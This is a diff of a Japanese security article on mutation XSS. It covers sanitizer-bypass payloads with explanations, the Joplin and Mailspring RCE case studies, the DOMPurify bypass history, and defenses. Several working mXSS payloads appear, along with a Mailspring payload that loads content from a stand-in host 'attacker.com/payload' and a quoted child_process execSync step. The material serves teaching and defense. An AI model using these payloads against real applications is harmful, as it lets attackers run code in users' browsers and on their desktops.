-このチートシートの発想の中核は、繰り返しになりますが「**サニタイザには raw text（テキスト）として見え、ブラウザには HTML として解釈される文字列を作る**」ことにあります。
-
-> 出典: SonarSource/mxss-cheatsheet（README / explained） — https://github.com/SonarSource/mxss-cheatsheet
-> 出典: mXSS Explained（GitHub Pages ミラー） — https://sonarsource.github.io/mxss-cheatsheet/explained/
-
----
-
-### 代表的なペイロード集（チートシート・二次資料からの再現）
-
-以下は、チートシートおよび権威ある二次資料の検索スニペットから再現した代表的 mXSS ペイロードです。各ペイロードには **「なぜ動くのか」** を必ず添えます。実運用での検証時は、対象ブラウザ・対象サニタイザのバージョンで挙動が変わるため、必ず原典と実機でご確認ください。
+以下は、Sonar の記事・チートシートおよび権威ある研究から再現した代表的 mXSS ペイロードです。各ペイロードには **「なぜ動くのか」** を必ず添えます。
 
 #### 例1: 古典 ―― `<listing>` / エンティティ・デコード（IE時代の原点）
 
@@ -222,141 +277,223 @@ Sonar のこの記事は、mXSS を「あなたのコードに潜む脆弱性」
 <listing>&lt;img src=1 onerror=alert(1)&gt;</listing>
 ```
 
-- **なぜ動くのか**: 攻撃者は一見「エスケープ済みの安全なテキスト」`&lt;img ...&gt;` を渡している。しかし当時の IE は `<listing>`（古い整形済みテキスト要素）の `innerHTML` を読み戻すときにエンティティを `<`/`>` へデコードしてしまい、返り値が `<img src=1 onerror=alert(1)>` という**本物のタグ**に変異した。文字列を再取得・再挿入するコードがあると、この変異した本物のタグが実行される。mXSS の"原点"となった挙動。
+- **なぜ動くのか**: 当時の IE は `<listing>`（古い整形済みテキスト要素）の `innerHTML` を読み戻すときにエンティティを `<`/`>` へデコードしてしまい、返り値が `<img src=1 onerror=alert(1)>` という本物のタグに変異した。文字列を再取得・再挿入するコードがあると、この変異した本物のタグが実行される。mXSS の"原点"となった挙動。
 
 > 出典: mXSS Attacks（Heiderich et al., 2013） — https://cure53.de/fp170.pdf
 
-#### 例2: `<noscript>` × `DOMParser`（scripting フラグ依存）
+#### 例2: `<noscript>` × scripting フラグ（Parser Differential）
 
 ```html
-<noscript><p title="</noscript><img src=x onerror=alert(1)>">
+<noscript><style></noscript><img src=x onerror="alert(1)">
 ```
 
-- **なぜ動くのか**: サニタイザ内部の `DOMParser` はスクリプト無効とみなすため、`<noscript>` の中身を raw text として扱い、`</noscript>` までを"ただのテキスト"だと判断して素通しする。ところが実ページはスクリプト有効なので、同じ文字列を再パースすると `<noscript>` の中身が**HTMLとして再解釈**され、`<img onerror>` が本物の要素として出現・発火する。Firefox の CVE-2021-23974 が実例。
+- **なぜ動くのか**: サニタイザ内部の `DOMParser` はスクリプト無効とみなすため、`<noscript>` の中身を raw text として扱い、`</noscript>` までをテキストとして素通しする。実ページはスクリプト有効なので、同じ文字列を再パースすると `<noscript>` の中身がHTMLとして再解釈され、`<style>` の後の `</noscript>` で `<noscript>` が閉じ、`<img onerror>` が本物の要素として出現・発火する。
 
-> 出典: CVE-2021-23974（Bugzilla@Mozilla） — https://bugzilla.mozilla.org/show_bug.cgi?id=1528997
-
-#### 例3: MathML `<mglyph>` + `<style>`（名前空間による style 解釈差）
+#### 例3: Form + MathML + Style（Parsing Round Trip）
 
 ```html
-<math><mtext><table><mglyph><style><img src="x" onerror="alert(1)"></style></mglyph></table></mtext></math>
+<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>
 ```
 
-- **なぜ動くのか**: `<mtext>` は MathMLテキスト統合点。`<mglyph>` はその直下にあるとき MathML 名前空間に留まる特殊要素。この文脈での `<style>` は foreign content の style となり、サニタイザ側では「`<style>` の中身は raw text」だと判断して `<img onerror>` を無害なテキスト扱いで残す。ところが `<table>` の foster parenting（里子出し）や名前空間の再解決を経て再パースすると、`<img>` が `<style>` の"外"の HTML 要素として実体化し、`onerror` が発火する。「style の中に隠したタグを、再パースで style の外へ運び出す」典型。
+- **なぜ動くのか**: `<form>` の入れ子不可ルールにより、1回目のパースと再パースで `</form>` の効き方が変わる。`<mtext>` は MathMLテキスト統合点、`<mglyph>` はその直下で MathML 名前空間に留まる例外要素。`<style>` が MathML の foreign content 内にあるため raw text ではなくなり、`</math>` で名前空間が HTML に戻った後の `<img onerror>` が本物の要素として解釈される。複数のパース癖を直列に積み上げた高度なベクタ。
 
-> 出典: mXSS cheatsheet（SonarSource） — https://sonarsource.github.io/mxss-cheatsheet/examples/
+#### 例4: SVG × Style × 属性値（名前空間混同の典型）
 
-#### 例4: DOMPurify < 2.0.17 名前空間混同（Michał Bentkowski）
+```html
+<svg><style><a alt="</style><img src=x onerror=alert(1)>">
+```
+
+- **なぜ動くのか**: SVG 名前空間内の `<style>` は raw text 要素ではない。したがって `<a>` の `alt` 属性値に含まれる `</style>` が、シリアライズ→再パースの過程で本物の閉じタグとして機能し、続く `<img onerror>` が HTML 要素として出現する。後述の Joplin（CVE-2023-33726）はまさにこのペイロードで攻略された。
+
+#### 例5: DOMPurify < 2.0.17 名前空間混同（Michał Bentkowski）
 
 ```html
 <form><math><mtext></form><form><mglyph><svg><mtext><style><path id="</style><img onerror=alert(1) src>">
 ```
 
-- **なぜ動くのか**: `<form>` の入れ子と MathML/SVG の名前空間切り替えを組み合わせ、DOMPurify のパースと実ブラウザのパースで **`<style>` の閉じ位置と要素の所属名前空間がズレる**ように仕組む。DOMPurify（2.0.17 未満）は `<style>` の中身 `</style><img onerror=alert(1) src>` を raw text として安全と判断するが、シリアライズ→再パースの過程で `</style>` が本物の閉じタグとして効き、続く `<img onerror>` が独立したHTML要素として蘇る。修正では「要素が本当に正しい名前空間にあるか、親要素の名前空間を辿って検証する」対策が導入された（Bentkowski の提案が採用）。
+- **なぜ動くのか**: `<form>` の入れ子と MathML/SVG の名前空間切り替えを組み合わせ、DOMPurify のパースと実ブラウザのパースで `<style>` の閉じ位置と要素の所属名前空間がズレるように仕組む。DOMPurify（2.0.17 未満）は `<style>` の中身を raw text として安全と判断するが、シリアライズ→再パースの過程で `</style>` が本物の閉じタグとして効き、`<img onerror>` が独立したHTML要素として蘇る。
 
 > 出典: Mutation XSS via namespace confusion – DOMPurify +2.0.17 bypass（Michał Bentkowski / Securitum） — https://www.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass.html
-> 出典: Jak pomogłem zabezpieczyć DOMPurify（Sekurak, Bentkowski） — https://sekurak.pl/jak-pomoglem-zabezpieczyc-dompurify/
 
-#### 例5: DOMPurify < 2.2.2 「From SVG and back」（Daniel Santos）
+#### 例6: DOMPurify < 2.2.2「From SVG and back」（Daniel Santos）
 
 ```html
 <svg></p><textarea><title><style></textarea><img src=x onerror=alert(1)></style></title></svg>
 ```
 
-- **なぜ動くのか**: `<svg>` で SVG 名前空間に入ると、`<style>` の子孫は（HTML名前空間の同名要素＝homograph と異なり）**通常のHTMLとして描画されうる**。SVG の `<path>` の `id` 属性のような"自由記述の安全なテキスト"に見える箇所へ攻撃コードを潜ませ、SVG から HTML へ"戻る（back）"境界の解釈差で `<img onerror>` を実体化させる。`</p>` や `<textarea>`/`<title>`（RCDATA要素）を挟んでパース状態を意図的にずらしているのがポイント。DOMPurify 2.2.2 で修正。
+- **なぜ動くのか**: `<svg>` で SVG 名前空間に入ると `<style>` の子孫は通常のHTMLとして描画されうる。`</p>` や `<textarea>`/`<title>`（RCDATA要素）を挟んでパース状態を意図的にずらし、SVG から HTML へ"戻る"境界の解釈差で `<img onerror>` を実体化させる。DOMPurify 2.2.2 で修正。
 
-> 出典: From SVG and back, yet another mutation XSS via namespace confusion for DOMPurify < 2.2.2 bypass（Daniel Santos / vovohelo） — https://vovohelo.medium.com/from-svg-and-back-yet-another-mutation-xss-via-namespace-confusion-for-dompurify-2-2-2-bypass-5d9ae8b1878f
+> 出典: From SVG and back, yet another mutation XSS via namespace confusion for DOMPurify < 2.2.2 bypass（Daniel Santos） — https://vovohelo.medium.com/from-svg-and-back-yet-another-mutation-xss-via-namespace-confusion-for-dompurify-2-2-2-bypass-5d9ae8b1878f
 
-#### 例6: `<foreignObject>` × テーブル × コメント breakout
+---
+
+### ケーススタディ①: Joplin（CVE-2023-33726）―― mXSS から任意コマンド実行へ
+
+**Joplin** はオープンソースのノートアプリで、Electron（Chromiumベースのデスクトップアプリケーションフレームワーク）上で動作します。
+
+#### 脆弱性の原因
+
+Joplin はHTMLサニタイズに **htmlparser2** という npm パッケージを使用していました。このパッケージは **「仕様準拠よりも速度を優先する（doesn't follow the specification and prefers speed over accuracy）」** という設計方針をとっており、ブラウザの HTML パーサとは異なる解釈をするケースがありました。
+
+#### 攻撃ペイロード
 
 ```html
-<svg><a><foreignobject><a><table><a></table><style><!--</style></svg><a id="-><img src onerror=alert(1)>">
+<svg><style><a alt="</style><img src=x onerror=alert(1)>">
 ```
 
-- **なぜ動くのか**: `<foreignObject>` は HTML統合点なので、その内部でHTML島が作られる。`<table>` の foster parenting、`<style>` の raw text 解釈、HTMLコメント `<!-- -->` の閉じ位置解釈を重ね合わせ、サニタイザには「コメント/スタイル内の無害な文字列」に見えるものを、再パース時に `id="...">` の属性境界を破って `<img onerror>` として外へ出す。**複数のパース癖を"直列"に積み上げて差分を最大化する**、チートシート上級ベクタの典型。
+htmlparser2 はこの入力を解析する際、SVG 名前空間内の `<style>` を HTML 名前空間と同様に raw text として扱い、中身をただのテキストと判断しました。しかし Electron（Chromium）のHTMLパーサは仕様に忠実に SVG 内の `<style>` を foreign content として扱うため、`</style>` が閉じタグとして機能し、`<img onerror>` が本物の要素として出現しました。
 
-> 出典: mXSS cheatsheet — Payload examples（SonarSource） — https://sonarsource.github.io/mxss-cheatsheet/examples/
+#### 影響範囲
+
+Joplin は Electron 上で動作し、Node.js へのアクセス権限を持っていたため、mXSS による JavaScript 実行は **任意のコマンド実行（RCE: Remote Code Execution）** に直結しました。ノートアプリに悪意のあるHTMLを含むノートを共有するだけで、被害者のマシン上で任意のコマンドが実行される危険がありました。
+
+この事例は、mXSS が単なる「ブラウザでアラートが出る」レベルの問題ではなく、デスクトップアプリでは **OS レベルの侵害に直結する** ことを明確に示しています。
+
+> 出典: mXSS: The Vulnerability Hiding in Your Code（Sonar） — https://www.sonarsource.com/blog/mxss-the-vulnerability-hiding-in-your-code/
+
+---
+
+### ケーススタディ②: Mailspring ―― mXSS → サンドボックス脱出 → RCE
+
+Sonar が発見した Mailspring（デスクトップメールクライアント、Electron製）の脆弱性は、mXSS を起点とした多段階の攻撃チェーンで **RCE（任意コマンド実行）** に至った事例です。
+
+#### 攻撃チェーンの全体像
+
+**ステップ1 ―― mXSS（SVG/style のパーサ差分）:**
+攻撃者は SVG 内の `<style>` を利用した mXSS ペイロードを含むメールを送信します。
+
+**ステップ2 ―― サンドボックスの初期防御:**
+メールの初回表示時は、コンテンツがサンドボックス化された iframe 内にレンダリングされるため、JavaScript は実行されません。
+
+**ステップ3 ―― 返信/転送によるサンドボックス脱出:**
+被害者がそのメールに**返信または転送**すると、メール本文がサンドボックスの外で再レンダリングされます。この再レンダリング時に mXSS による変異が発生し、JavaScript が実行可能になります。
+
+**ステップ4 ―― CSP バイパスと二次サニタイズの回避:**
+Mailspring の CSP（Content Security Policy）には設定ミスがあり、`<object>` タグが許可されていました。さらに、`<signature>` タグ（Mailspring 独自のカスタム要素）を使うことで二次的なサニタイズ処理を回避できました。
+
+最終的なペイロード:
+
+```html
+<svg><style><a title="</style><signature><object data='attacker.com/payload'></object></signature>">
+```
+
+**ステップ5 ―― RCE への到達:**
+
+2つの経路が存在しました。
+
+- **経路A（Electron の既知脆弱性）**: Mailspring は Electron 17.4.0（Chrome 98 ベース）を使用しており、**CVE-2022-1364**（Chrome の型混同脆弱性）に対して脆弱でした。
+- **経路B（CSS による情報窃取 → ファイルアクセス → コマンド実行）**: CSS の `url()` を使って添付ファイルのパスを外部に漏洩させ、same-origin のファイルアクセスを経由して `top.require('child_process').execSync('arbitrary_command')` により任意のコマンドを実行しました。
+
+#### タイムライン
+
+- 2023年4月27日: Sonar が初回報告
+- 2023年7月4日: ベンダー承認
+- 2023年7月29日: CSP の強化パッチ適用
+- 2024年3月9日: Sonar がブログ記事を公開
+
+影響を受けたバージョンは **Mailspring 1.11.0 未満** です。
+
+この事例が示す教訓は明確です。**mXSS 単体は JavaScript 実行に過ぎないが、Electron アプリの特権的な実行環境、CSP の設定ミス、古いランタイムの既知脆弱性が連鎖すると、1通のメールで被害者のマシンを完全に掌握できる。**
+
+> 出典: Reply to Calc: The Attack Chain to Compromise Mailspring（Sonar） — https://www.sonarsource.com/blog/reply-to-calc-the-attack-chain-to-compromise-mailspring/
 
 ---
 
 ### DOMPurify バイパスの歴史とバージョン依存（陳腐化への注意）
 
-mXSS ペイロードは**サニタイザのバージョンに強く依存**します。「どのバージョンで何が直ったか」を押さえないと、古い攻撃を最新版に撃って外したり、逆に古い依存を使い続けて被弾したりします。以下は DOMPurify（最も広く使われるクライアントサイド・サニタイザ）の主要な mXSS 関連バイパスと修正の時系列です（公開年・対象バージョンを明記）。
+mXSS ペイロードは**サニタイザのバージョンに強く依存**します。以下は DOMPurify（最も広く使われるクライアントサイド・サニタイザ）の主要な mXSS 関連バイパスと修正の時系列です。
 
 | 時期 | バイパスの種類 | 影響バージョン | 修正バージョン | 備考 |
 |---|---|---|---|---|
-| 2020 | MathML 名前空間混同（Bentkowski, 例4） | < 2.0.17 | **2.0.17** | 親名前空間の検証を導入 |
-| 2020 | SVG 名前空間混同「From SVG and back」（Santos, 例5） | < 2.2.2 | **2.2.2** | SVG→HTML 境界の解釈差 |
+| 2020 | MathML 名前空間混同（Bentkowski, 例5） | < 2.0.17 | **2.0.17** | 親名前空間の検証を導入 |
+| 2020 | SVG 名前空間混同「From SVG and back」（Santos, 例6） | < 2.2.2 | **2.2.2** | SVG→HTML 境界の解釈差 |
 | 2020–2021 | 追加の名前空間/mglyph 系（2.2.x で継続的に修正） | 2.2.x 系 | 2.2.3 / 2.2.4 / 2.2.6 ほか | いたちごっこが続いた時期 |
-| 2024公開 | **ネスト（入れ子）ベース mXSS**（CVE-2024-47875） | 修正前の全般 | **2.5.0 / 3.1.3** | 深い入れ子で再パース挙動が発散。**最大ネスト深さ ≈500** の上限を 3.1.1 で導入し対策 |
-| 2025公開 | **テンプレートリテラル正規表現の不備**（CVE-2025-26791） | < 3.2.4（`SAFE_FOR_TEMPLATES: true` 時） | **3.2.4** | 誤った正規表現で mXSS |
-| 2025公開 | **`<textarea>` raw text 検証漏れ**（`SAFE_FOR_XML`、CVE-2025-15599） | 3.1.3–3.2.6 / 2.5.3–2.5.8 | **3.2.7**（3.x 系）。**2.x 系は未修正のまま** | 2.x を使い続けるのは危険 |
-| 2026公開 | **プロトタイプ汚染 → カスタム要素処理のフォールバック経由 XSS**（CVE-2026-41238 ほか） | 該当版 | 以降のリリースで対応 | `CUSTOM_ELEMENT_HANDLING` 起点 |
+| 2024公開 | **ネスト（入れ子）ベース mXSS**（CVE-2024-47875） | 修正前の全般 | **2.5.0 / 3.1.3** | 深い入れ子で再パース挙動が発散 |
+| 2025公開 | **テンプレートリテラル正規表現の不備**（CVE-2025-26791） | < 3.2.4 | **3.2.4** | `SAFE_FOR_TEMPLATES: true` 時のみ |
+| 2025公開 | **`<textarea>` raw text 検証漏れ**（CVE-2025-15599） | 3.1.3–3.2.6 / 2.5.3–2.5.8 | **3.2.7**（3.x 系） | 2.x 系は未修正のまま |
 
-**バージョン依存に関する実務上の教訓（重要）**:
+**実務上の教訓:**
 
-- **常に最新の DOMPurify（本稿執筆時点で 3.4.x 系）へ更新する。** mXSS 修正は"追いつき"の連続であり、古い版に固定するとその後に発見された回避に必ず晒される。
+- **常に最新の DOMPurify へ更新する。** mXSS 修正は"追いつき"の連続であり、古い版に固定するとその後に発見された回避に必ず晒される。
 - **2.x 系は一部 CVE（例: CVE-2025-15599）が未修正のまま**。2.x を継続利用しているプロジェクトは 3.x への移行を検討すべき。
-- **非デフォルト設定は攻撃面を広げる**。`SAFE_FOR_TEMPLATES`（CVE-2025-26791）や `SAFE_FOR_XML`／`CUSTOM_ELEMENT_HANDLING`（CVE-2025-15599 / CVE-2026-41238）のように、既定から外れたオプションが新たなバイパスの入口になった例が複数ある。**必要のないオプションは有効化しない。**
+- **非デフォルト設定は攻撃面を広げる**。`SAFE_FOR_TEMPLATES`（CVE-2025-26791）や `SAFE_FOR_XML`（CVE-2025-15599）のように、既定から外れたオプションが新たなバイパスの入口になった例が複数ある。
+
+#### mXSS の影響を受けた他のサニタイザ
+
+DOMPurify だけが mXSS の標的ではありません。Sonar の記事では以下のサニタイザにも脆弱性があったことが言及されています。
+
+- **HtmlSanitizer**（CVE-2023-44390）
+- **TYPO3**（CVE-2023-38500）
+- **OWASP java-html-sanitizer**
+- **Mozilla bleach**
+- **Google Caja**
+- **DOMPurify 2.0.0**
+
+これらに共通するのは、**パーサの実装がブラウザのパーサと完全には一致しない** という構造的な問題です。
 
 > 出典: Attack Classes & Bypass History（cure53/DOMPurify Wiki） — https://github.com/cure53/DOMPurify/wiki/Attack-Classes-&-Bypass-History
-> 出典: CVE-2024-47875（Nesting-based mXSS） — https://osv.dev/vulnerability/CVE-2024-47875
-> 出典: CVE-2025-26791（template literal regex mXSS, fixed 3.2.4） — https://security.snyk.io/vuln/SNYK-JS-DOMPURIFY-8722251
-> 出典: DOMPurify XSS via Textarea Rawtext Bypass in SAFE_FOR_XML（CVE-2025-15599, fixed 3.2.7） — https://www.vulncheck.com/advisories/dompurify-xss-via-textarea-rawtext-bypass-in-safe-for-xml
-> 出典: CVE-2026-41238（Prototype Pollution to XSS via CUSTOM_ELEMENT_HANDLING） — https://github.com/advisories/GHSA-v9jr-rg53-9pgp
 
 ---
 
 ### 防御策のまとめ
 
-mXSS への対策は「サニタイザを信じきる」ことではなく、「**パーサ差分が生まれないように処理フロー全体を設計する**」ことです。
+mXSS への対策は「サニタイザを信じきる」ことではなく、「**パーサ差分が生まれないように処理フロー全体を設計する**」ことです。Sonar の記事が推奨する防御策を軸に整理します。
 
-1. **クライアントサイド・サニタイザ（DOMPurify）を、描画する場所と同じブラウザで使う。** サーバサイドのサニタイズは配信先ブラウザの多様さゆえに差分を排除できず、mXSS に構造的に弱い（Sonar の中心的主張）。どうしてもサーバ側で無害化する場合でも、クライアント側で最終防衛のサニタイズを重ねる。
-2. **サニタイズ後にHTMLを一切再加工しない（desanitization の回避）。** サニタイズ済み文字列の連結・再パース・別ライブラリへの再投入は、無害化を無効化しうる。「サニタイズは最終工程」を原則にする。
-3. **サニタイザを常に最新へ保つ。** mXSS 修正はバージョンで積み上がる。依存の自動更新（Dependabot / Renovate 等）と、既知 CVE のバージョン確認を運用に組み込む。非デフォルト・オプションは必要最小限に。
-4. **多層防御を敷く**:
-   - **CSP（Content Security Policy、実行可能なスクリプトの出所をブラウザ側で制限する仕組み）** を設定し、万一 mutation で `<script>`/`onerror` が生まれても実行を止める（`script-src` の厳格化、`'unsafe-inline'` の排除、nonce/hash 方式）。
-   - **Trusted Types**（DOM の危険な sink（＝ユーザー入力が最終的に実行・解釈される危険な代入先。例: `innerHTML`）への文字列代入を、検証済みの型でしか許さないブラウザ機構）を導入し、`innerHTML` 直代入を排除する。
-5. **危険な要素を避ける設計**: `<template>` や `<noscript>` はスクリプトフラグ依存でパースが変わる"パース非対称性の地雷"。特にサーバサイド処理では扱わない。ユーザーHTMLに SVG/MathML を許可する必要がなければ許可タグから外す。
-6. **名前空間を意識した検証**: 自前でサニタイズを実装する場合は「要素がどの名前空間に属するか」を親要素まで辿って確認する（DOMPurify が 2.0.17 で採った対策と同じ発想）。
+#### 1. クライアントサイド・サニタイズ（最重要）
 
-なお、WHATWG では `<style>`/`<script>`/`<xmp>` 等のパースを SVG・MathML・HTML の間で**一貫させる**提案（whatwg/html #11397）が議論されており、将来的にはブラウザ標準の側から mXSS の温床が減っていく可能性があります。とはいえ現時点では、上記の"差分を作らない設計"が現実的な防御です。
+**描画するのと同じブラウザ上でサニタイズする。** サーバサイドのサニタイズは配信先ブラウザの多様さゆえにパーサ差分を排除できず、mXSS に構造的に弱い。クライアントサイド・サニタイザ（DOMPurify 等）を使えば、サニタイズとレンダリングが同じパーサで行われるため差分が最小化されます。
 
-> 出典: mXSS: The Vulnerability Hiding in Your Code（Sonar, 防御指針） — https://www.sonarsource.com/blog/mxss-the-vulnerability-hiding-in-your-code/
-> 出典: [mXSS] Consider making HTML parsing consistent between SVG, MathML, HTML（whatwg/html #11397） — https://github.com/whatwg/html/issues/11397
+#### 2. 再パースの回避
+
+**サニタイズ済みのDOMツリーを直接挿入する。** サニタイズ結果をHTML文字列にシリアライズしてから `innerHTML` で再挿入するのではなく、DOMツリーそのものを挿入すれば、シリアライズ→再パースのラウンドトリップで生じる変異を回避できます。
+
+#### 3. サニタイズ後のエンコード
+
+サニタイズ後にHTMLを文字列として扱う必要がある場合は、**raw content をエンコードする**。サニタイズ済み文字列に対して後から加工・連結・再パースを行わない（desanitization の回避）。
+
+#### 4. Foreign content の制限
+
+ユーザーHTMLに SVG/MathML を許可する必要がなければ、**SVG/MathML 要素を丸ごと削除する**。名前空間切り替えが発生しなければ、mXSS の最大の攻撃面が消滅します。
+
+#### 5. 文脈の一貫性
+
+サニタイザがフラグメントを解析する文脈と、アプリケーションがそのHTMLを埋め込む文脈を一致させる。たとえば、HTML 文脈でサニタイズしたHTMLを SVG 内に挿入しないようにする。
+
+#### 6. Sanitizer API（ブラウザネイティブのサニタイズ）
+
+**WICG（Web Incubator Community Group）で策定中の Sanitizer API** は、ブラウザ自身が提供するネイティブのサニタイズ機能です。ブラウザのパーサと完全に同じパーサでサニタイズが行われるため、パーサ差分の問題が原理的に解消されます。標準化が進めば、mXSS に対する最も根本的な解決策になり得ます。
+
+#### 7. 多層防御
+
+サニタイザは万能ではないことを前提に、以下を重ねます。
+
+- **CSP（Content Security Policy）** で `script-src` を厳格化し、`'unsafe-inline'` を排除する。nonce/hash 方式を採用する。
+- **Trusted Types** で `innerHTML` への生文字列代入を型レベルで禁止する。
+- サニタイザは**常に最新版**を使い、依存の自動更新（Dependabot / Renovate 等）を運用に組み込む。
+
+> 出典: mXSS: The Vulnerability Hiding in Your Code（Sonar） — https://www.sonarsource.com/blog/mxss-the-vulnerability-hiding-in-your-code/
 
 ---
 
 ### このセクションの要点（まとめ）
 
 - mXSS の核心は **「サニタイザの目には raw text、ブラウザの目には HTML」** となる文字列を作ること。バグではなく**パーサ差分（parser differential）**という仕様レベルの落とし穴を突く。
-- 変異を生む主因は **名前空間切り替え（HTML/SVG/MathML）・インテグレーションポイント・raw text/scripting フラグ・foster parenting・エンティティ/属性の再解釈** の5つ。
-- Sonar は実在事例（Skiff, Proton Mail, Joplin=RCE）で mXSS の実害を示し、**クライアントサイド・サニタイズ＋サニタイズ後に再加工しない**ことを推奨する。
-- SonarSource mXSS チートシートは **parser 再解釈の分類（Parser Discrepancies / Namespace & Context / Raw Text Elements）** に沿って、新規ベクタを厳選収録した実務資料。
-- ペイロードは**サニタイザのバージョンに強く依存**する。DOMPurify は 2.0.17 → 2.2.2 →（CVE-2024-47875）2.5.0/3.1.3 →（CVE-2025-26791）3.2.4 →（CVE-2025-15599）3.2.7 …と修正を重ねており、**常に最新版**を使うことが最重要。
+- Sonar は mXSS を **4つのパターン** に分類した: **Parser Differentials（パーサ差分）**、**Parsing Round Trip（パース往復）**、**Desanitization（脱サニタイズ）**、**Context-Dependent Parsing（文脈依存パース）**。
+- SonarSource mXSS チートシートは、HTML/SVG/MathML の各名前空間における要素の予期しない挙動（foster parenting、form の入れ子不可、foreign content breaker 等）を網羅的に整理した実務資料。
+- **Joplin（CVE-2023-33726）** は、仕様非準拠のパーサ（htmlparser2）と Electron の Node.js 権限の組み合わせにより、mXSS が RCE に直結した事例。
+- **Mailspring** は、mXSS → 返信/転送によるサンドボックス脱出 → CSP バイパス → RCE という多段階の攻撃チェーンで、1通のメールからマシンを掌握できた事例。
+- 防御の中核は **クライアントサイド・サニタイズ**（同一パーサで無害化）、**再パースの回避**（DOMツリーの直接挿入）、**foreign content の制限**、**Sanitizer API への移行**。サニタイザの最新化と多層防御（CSP、Trusted Types）を必ず重ねる。
 
 ---
 
 ### 出典一覧
 
-**担当した一次資料（いずれも直接取得は環境制約で不可。上記各所に警告ブロックを明記）**
-
 - mXSS: The Vulnerability Hiding in Your Code（Sonar） — https://www.sonarsource.com/blog/mxss-the-vulnerability-hiding-in-your-code/
-- SonarSource / mxss-cheatsheet（GitHub） — https://github.com/SonarSource/mxss-cheatsheet （ミラー: https://sonarsource.github.io/mxss-cheatsheet/ ／ explained: https://sonarsource.github.io/mxss-cheatsheet/explained/ ／ examples: https://sonarsource.github.io/mxss-cheatsheet/examples/ ）
-
-**内容の復元・裏付けに用いた二次資料**
-
-- Code Vulnerabilities Put Skiff Emails at Risk（Sonar） — https://www.sonarsource.com/blog/code-vulnerabilities-put-skiff-emails-at-risk
-- mXSS: The Vulnerability Hiding in Your Code（Security Boulevard 転載） — https://securityboulevard.com/2024/05/mxss-the-vulnerability-hiding-in-your-code/
-- Attack Classes & Bypass History（cure53/DOMPurify Wiki） — https://github.com/cure53/DOMPurify/wiki/Attack-Classes-&-Bypass-History
-- Mutation XSS via namespace confusion – DOMPurify +2.0.17 bypass（Michał Bentkowski / Securitum） — https://www.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass.html
-- From SVG and back … DOMPurify < 2.2.2 bypass（Daniel Santos / vovohelo） — https://vovohelo.medium.com/from-svg-and-back-yet-another-mutation-xss-via-namespace-confusion-for-dompurify-2-2-2-bypass-5d9ae8b1878f
+- SonarSource / mxss-cheatsheet（GitHub / GitHub Pages） — https://github.com/SonarSource/mxss-cheatsheet / https://sonarsource.github.io/mxss-cheatsheet/
+- mXSS Explained（SonarSource） — https://sonarsource.github.io/mxss-cheatsheet/explained/
+- Reply to Calc: The Attack Chain to Compromise Mailspring（Sonar） — https://www.sonarsource.com/blog/reply-to-calc-the-attack-chain-to-compromise-mailspring/
 - mXSS Attacks: Attacking well-secured Web-Applications by using innerHTML Mutations（Heiderich et al., ACM CCS 2013） — https://cure53.de/fp170.pdf
-- CVE-2021-23974 mXSS via noscript / DOMParser（Bugzilla@Mozilla） — https://bugzilla.mozilla.org/show_bug.cgi?id=1528997
-- CVE-2024-47875 Nesting-based mXSS（OSV） — https://osv.dev/vulnerability/CVE-2024-47875
-- CVE-2025-26791 template literal regex mXSS（Snyk） — https://security.snyk.io/vuln/SNYK-JS-DOMPURIFY-8722251
-- CVE-2025-15599 Textarea Rawtext Bypass in SAFE_FOR_XML（VulnCheck） — https://www.vulncheck.com/advisories/dompurify-xss-via-textarea-rawtext-bypass-in-safe-for-xml
-- CVE-2026-41238 Prototype Pollution → XSS via CUSTOM_ELEMENT_HANDLING（GitHub Advisory） — https://github.com/advisories/GHSA-v9jr-rg53-9pgp
-- `<annotation-xml>`（MDN） — https://developer.mozilla.org/en-US/docs/Web/MathML/Element/annotation-xml
-- whatwg/html #11397（style/script/xmp のパース一貫化提案） — https://github.com/whatwg/html/issues/11397
-- MXSS Evolution and Timeline: A primer to MXSS（s1r1us） — https://s1r1us.ninja/posts/mxss-101/
+- Mutation XSS via namespace confusion – DOMPurify +2.0.17 bypass（Michał Bentkowski / Securitum） — https://www.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass.html
+- From SVG and back … DOMPurify < 2.2.2 bypass（Daniel Santos） — https://vovohelo.medium.com/from-svg-and-back-yet-another-mutation-xss-via-namespace-confusion-for-dompurify-2-2-2-bypass-5d9ae8b1878f
+- Attack Classes & Bypass History（cure53/DOMPurify Wiki） — https://github.com/cure53/DOMPurify/wiki/Attack-Classes-&-Bypass-History
+- Code Vulnerabilities Put Skiff Emails at Risk（Sonar） — https://www.sonarsource.com/blog/code-vulnerabilities-put-skiff-emails-at-risk
